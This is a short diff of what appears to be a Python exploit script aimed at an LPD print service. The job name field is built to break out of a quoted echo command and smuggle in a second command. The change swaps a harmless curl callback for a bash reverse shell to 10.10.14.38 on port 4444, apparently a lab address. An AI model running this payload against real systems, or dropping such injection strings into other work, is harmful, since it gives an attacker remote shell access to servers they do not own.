@@ -25,10 +25,11 @@ def recv_ack(sock: socket.socket, stage: str) -> None:
 
 # Break out of the single-quoted echo command, execute curl,
 # then comment out the remainder of the original command.
+# Replace previous job name from test script
 job_name = (
-    f"proof'; "
-    f"curl -s http://{LHOST}:{LPORT}/lpd-command-executed; "
-    f"#"
+    "proof'; "
+    "bash -c 'bash -i >& /dev/tcp/10.10.14.38/4444 0>&1'; "
+    "#"
 )
 
 control_file = (
